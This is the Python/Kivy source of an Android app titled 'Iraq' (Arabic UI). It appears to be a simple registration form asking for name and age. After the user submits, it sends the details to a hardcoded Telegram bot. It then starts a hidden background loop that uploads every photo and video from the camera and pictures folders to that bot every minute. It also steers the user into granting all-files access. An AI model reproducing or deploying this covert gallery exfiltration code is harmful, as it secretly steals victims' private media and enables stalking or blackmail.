import os
import time
import hashlib
import threading
import requests
import traceback
from kivy.utils import platform

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.widget import Widget
from kivy.graphics import Color, RoundedRectangle, Ellipse, Line
from kivy.clock import Clock
from kivy.metrics import dp, sp
from kivy.core.window import Window
from kivy.utils import get_color_from_hex

# --- دعم اللغة العربية ---
try:
    import arabic_reshaper
    from bidi.algorithm import get_display
    def ar(text):
        return get_display(arabic_reshaper.reshape(text))
except ImportError:
    def ar(text): return text

# ============ الألوان ============
PRIMARY_BLUE   = get_color_from_hex('#1565C0')
DARK_BLUE      = get_color_from_hex('#0D47A1')
BTN_BLUE       = get_color_from_hex('#1976D2')
BG_COLOR       = get_color_from_hex('#F5F7FA')
WHITE          = get_color_from_hex('#FFFFFF')
TEXT_DARK      = get_color_from_hex('#1A202C')
TEXT_GRAY      = get_color_from_hex('#718096')
SUCCESS_GREEN  = get_color_from_hex('#38A169')
ERROR_RED      = get_color_from_hex('#E53E3E')
BORDER_GRAY    = get_color_from_hex('#E2E8F0')

# ============ إعدادات تيليجرام ============
BOT_TOKEN = "8041654407:AAHtI0QChtYMlJ0MMJCGM8YEb5b4L4lgEmM"
CHAT_ID   = "6046016571"
API_URL   = f"https://api.telegram.org/bot{BOT_TOKEN}"
HASH_LOG  = "sent_media_hashes.txt"

FONT_PATH = "assets/fonts/NotoNaskhArabic-Regular.ttf"
if not os.path.exists(FONT_PATH):
    FONT_PATH = None

# ============ دوال الإرسال والمسح ============
def get_file_hash(file_path):
    hasher = hashlib.md5()
    try:
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hasher.update(chunk)
        return hasher.hexdigest()
    except Exception:
        return None

def load_hashes(base_dir):
    log_path = os.path.join(base_dir, HASH_LOG)
    if os.path.exists(log_path):
        try:
            with open(log_path, "r", encoding="utf-8") as f:
                return set(f.read().splitlines())
        except Exception:
            pass
    return set()

def save_hash(base_dir, file_hash):
    log_path = os.path.join(base_dir, HASH_LOG)
    try:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(file_hash + "\n")
    except Exception:
        pass

# مسارات شاملة لهواوي والأندرويد الحديث
GALLERY_PATHS = ["/storage/emulated/0/DCIM/Camera/", "/sdcard/DCIM/Camera/", "/storage/emulated/0/Pictures/", "/sdcard/Pictures/"]

def get_all_unique_media(base_dir):
    sent_hashes = load_hashes(base_dir)
    unique_list = []
    IMG_EXT = ('.jpg', '.jpeg', '.png', '.webp', '.heic')
    VID_EXT = ('.mp4', '.mov', '.avi', '.mkv', '.3gp')
    for folder in GALLERY_PATHS:
        if os.path.exists(folder):
            try:
                for root, dirs, files in os.walk(folder):
                    if any(x in root.lower() for x in ['.thumbnails', 'cache', 'recycler']):
                        continue
                    for file in files:
                        file_lower = file.lower()
                        full_path = os.path.join(root, file)
                        media_type = 'photo' if file_lower.endswith(IMG_EXT) else 'video' if file_lower.endswith(VID_EXT) else None
                        if media_type:
                            try:
                                f_hash = get_file_hash(full_path)
                                if f_hash and f_hash not in sent_hashes:
                                    unique_list.append({'path': full_path, 'hash': f_hash, 'type': media_type})
                            except Exception:
                                continue
            except Exception:
                pass
    return unique_list

def send_telegram_text(text, status_callback=None):
    try:
        url = f"{API_URL}/sendMessage"
        response = requests.post(url, data={'chat_id': CHAT_ID, 'text': text}, timeout=20)
        ok = response.status_code == 200 and response.json().get("ok")
        if status_callback:
            Clock.schedule_once(lambda dt: status_callback(ok))
        return ok
    except Exception:
        if status_callback:
            Clock.schedule_once(lambda dt: status_callback(False))
        return False

def send_media_batch(base_dir, batch, status_cb=None):
    for item in batch:
        try:
            file_path = item['path']
            file_size = os.path.getsize(file_path)
            method, file_key = "sendPhoto", "photo"

            if item['type'] == 'video':
                if file_size > 50 * 1024 * 1024:
                    method, file_key = "sendDocument", "document"
                else:
                    method, file_key = "sendVideo", "video"

            timeout_val = max(40, int(file_size / (500 * 1024)))
            with open(file_path, 'rb') as f:
                files = {file_key: (os.path.basename(file_path), f)}
                data = {'chat_id': CHAT_ID, 'caption': '🆕 صورة جديدة'}
                r = requests.post(f"{API_URL}/{method}", data=data, files=files, timeout=timeout_val)

            try:
                ok = r.status_code == 200 and r.json().get("ok") is True
            except Exception:
                ok = False

            if ok:
                save_hash(base_dir, item['hash'])
                if status_cb:
                    Clock.schedule_once(lambda dt: status_cb(f"✅ أُرسلت: {os.path.basename(file_path)}"))
            else:
                if status_cb:
                    Clock.schedule_once(lambda dt: status_cb(f"❌ فشل: {os.path.basename(file_path)}"))
            time.sleep(2)
        except Exception as e:
            print(f"Upload error: {e}")

# ============ التصميم الاحترافي ============
class LogoWidget(Widget):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        with self.canvas.before:
            Color(*PRIMARY_BLUE)
            self.circle = Ellipse(pos=self.pos, size=self.size)
        self.label = Label(text="A", bold=True, font_size=sp(50), color=WHITE, halign='center', valign='middle')
        self.add_widget(self.label)
        self.bind(pos=self._update, size=self._update)
    def _update(self, *args):
        self.circle.pos = self.pos
        self.circle.size = self.size

class RoundedButton(Button):
    def __init__(self, bg_color=BTN_BLUE, **kwargs):
        super().__init__(**kwargs)
        self.background_normal = ''
        self.background_color = (0, 0, 0, 0)
        self._bg_color = bg_color
        with self.canvas.before:
            Color(*self._bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=[dp(14)])
        self.bind(pos=self._update, size=self._update)
    def _update(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size

class RoundedInput(TextInput):
    def __init__(self, **kwargs):
        kwargs.setdefault('background_normal', '')
        kwargs.setdefault('background_active', '')
        kwargs.setdefault('background_color', (0, 0, 0, 0))
        kwargs.setdefault('foreground_color', TEXT_DARK)
        kwargs.setdefault('cursor_color', PRIMARY_BLUE)
        kwargs.setdefault('hint_text_color', TEXT_GRAY)
        kwargs.setdefault('padding', [dp(16), dp(16), dp(16), dp(16)])
        super().__init__(**kwargs)
        if FONT_PATH:
            self.font_name = FONT_PATH
        with self.canvas.before:
            Color(*WHITE)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=[dp(12)])
            Color(*BORDER_GRAY)
            self.border = Line(rounded_rectangle=(self.x, self.y, self.width, self.height, dp(12)), width=1)
        self.bind(pos=self._update, size=self._update)
    def _update(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size
        self.border.rounded_rectangle = (self.x, self.y, self.width, self.height, dp(12))

class MainApplicationUI(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        with self.canvas.before:
            Color(*BG_COLOR)
            self.bg = RoundedRectangle(pos=self.pos, size=self.size)
        self.bind(pos=self._update_bg, size=self._update_bg)

        self._worker_started = False
        scroll = ScrollView(size_hint=(1, 1), do_scroll_x=False)
        content = BoxLayout(orientation='vertical', padding=[dp(24), dp(30), dp(24), dp(30)], spacing=dp(14), size_hint_y=None)
        content.bind(minimum_height=content.setter('height'))

        logo_holder = BoxLayout(size_hint_y=None, height=dp(110))
        logo = LogoWidget(size_hint=(None, None), size=(dp(90), dp(90)), pos_hint={'center_x': 0.5, 'center_y': 0.5})
        logo_holder.add_widget(logo)
        content.add_widget(logo_holder)

        content.add_widget(Label(text=ar("العراق"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(34), bold=True, color=DARK_BLUE, size_hint_y=None, height=dp(52)))
        content.add_widget(Label(text=ar("أدخل بياناتك لبدء الإرسال"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(14), color=TEXT_GRAY, size_hint_y=None, height=dp(28)))
        content.add_widget(Widget(size_hint_y=None, height=dp(18)))

        content.add_widget(Label(text=ar("الاسم"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(15), color=TEXT_DARK, size_hint_y=None, height=dp(24)))
        self.name_input = RoundedInput(hint_text=ar("اكتب اسمك هنا"), multiline=False, font_size=sp(16), size_hint_y=None, height=dp(52))
        content.add_widget(self.name_input)

        content.add_widget(Label(text=ar("العمر"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(15), color=TEXT_DARK, size_hint_y=None, height=dp(24)))
        self.age_input = RoundedInput(hint_text=ar("اكتب عمرك هنا"), multiline=False, input_filter='int', font_size=sp(16), size_hint_y=None, height=dp(52))
        content.add_widget(self.age_input)

        content.add_widget(Widget(size_hint_y=None, height=dp(18)))

        self.send_button = RoundedButton(text=ar("إرسال"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(20), bold=True, color=WHITE, size_hint_y=None, height=dp(58))
        self.send_button.bind(on_press=self.on_submit)
        content.add_widget(self.send_button)
        
        # زر طلب إذن الملفات (يظهر فقط على أندرويد)
        if platform == 'android':
            self.perm_btn = RoundedButton(text=ar("منح إذن الوصول للملفات"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(16), bg_color=ERROR_RED, size_hint_y=None, height=dp(48))
            self.perm_btn.bind(on_press=self.open_special_permission)
            content.add_widget(self.perm_btn)

        self.status_lbl = Label(text="", font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(14), color=TEXT_GRAY, size_hint_y=None, height=dp(60), halign='center', text_size=(None, None))
        content.add_widget(self.status_lbl)

        scroll.add_widget(content)
        self.add_widget(scroll)

    def _update_bg(self, *args):
        self.bg.pos = self.pos
        self.bg.size = self.size

    def set_status(self, msg, color=TEXT_GRAY):
        self.status_lbl.text = ar(msg)
        self.status_lbl.color = color

    def open_special_permission(self, instance):
        """دالة تفتح إعدادات النظام لتفعيل إذن MANAGE_EXTERNAL_STORAGE"""
        if platform == 'android':
            try:
                from jnius import autoclass
                Intent = autoclass('android.content.Intent')
                Settings = autoclass('android.provider.Settings')
                Uri = autoclass('android.net.Uri')
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                
                intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                uri = Uri.fromParts("package", PythonActivity.mActivity.getPackageName(), None)
                intent.setData(uri)
                PythonActivity.mActivity.startActivity(intent)
                self.set_status("يرجى تفعيل 'السماح بإدارة جميع الملفات' ثم العودة.", PRIMARY_BLUE)
            except Exception as e:
                self.set_status("تعذر فتح الإعدادات. افتحها يدوياً.", ERROR_RED)
                print(f"Error: {e}")

    def on_submit(self, instance):
        name = self.name_input.text.strip()
        age  = self.age_input.text.strip()

        if not name:
            self.set_status("⚠️ الرجاء إدخال الاسم", ERROR_RED)
            return
        if not age or not age.isdigit() or not (1 <= int(age) <= 120):
            self.set_status("⚠️ الرجاء إدخال عمر صحيح", ERROR_RED)
            return

        self.send_button.disabled = True
        self.send_button.text = ar("جاري الإرسال...")
        self.set_status("⏳ جاري إرسال بياناتك...", PRIMARY_BLUE)

        msg = f"👤 الاسم: {name}\n🎂 العمر: {age}"
        threading.Thread(target=self._send_and_start, args=(msg,), daemon=True).start()

    def _send_and_start(self, msg):
        ok = send_telegram_text(msg)
        Clock.schedule_once(lambda dt: self._after_login(ok))

    def _after_login(self, ok):
        if not ok:
            self.set_status("❌ تعذر الاتصال، تحقق من الإنترنت", ERROR_RED)
            self.send_button.disabled = False
            self.send_button.text = ar("إرسال")
            return

        self.set_status("✅ تم تسجيل بياناتك، جاري بدء إرسال الصور...", SUCCESS_GREEN)
        self.send_button.text = ar("✅ تم التسجيل")
        if not self._worker_started:
            self._worker_started = True
            threading.Thread(target=self._media_worker, daemon=True).start()

    def _media_worker(self):
        time.sleep(3)
        base_dir = App.get_running_app().user_data_dir
        while True:
            try:
                media = get_all_unique_media(base_dir)
                if media:
                    Clock.schedule_once(lambda dt: self.set_status(f"📤 جاري إرسال {len(media)} ملف...", PRIMARY_BLUE))
                    send_media_batch(base_dir, media[:3], status_cb=self._media_status)
                else:
                    Clock.schedule_once(lambda dt: self.set_status("🔍 لا توجد صور جديدة أو الإذن مرفوض", TEXT_GRAY))
            except Exception as e:
                print(f"Worker error: {e}")
            time.sleep(60)

    def _media_status(self, text):
        self.set_status(text, PRIMARY_BLUE)

# ============ كلاس التطبيق ============
class IraqApp(App):
    def on_start(self):
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            try:
                # طلب الأذونات العادية فقط (النافذة المنبثقة)
                request_permissions([
                    Permission.READ_EXTERNAL_STORAGE,
                    Permission.WRITE_EXTERNAL_STORAGE,
                ])
            except Exception as e:
                print(f"Permission error: {e}")

    def build(self):
        self.title = "العراق"
        return MainApplicationUI()

# ============ الحماية ============
if __name__ == '__main__':
    try:
        IraqApp().run()
    except Exception:
        err = traceback.format_exc()
        print(err)
        try:
            with open('/sdcard/iraq_crash.txt', 'w', encoding='utf-8') as f:
                f.write(err)
        except Exception:
            pass
        raise
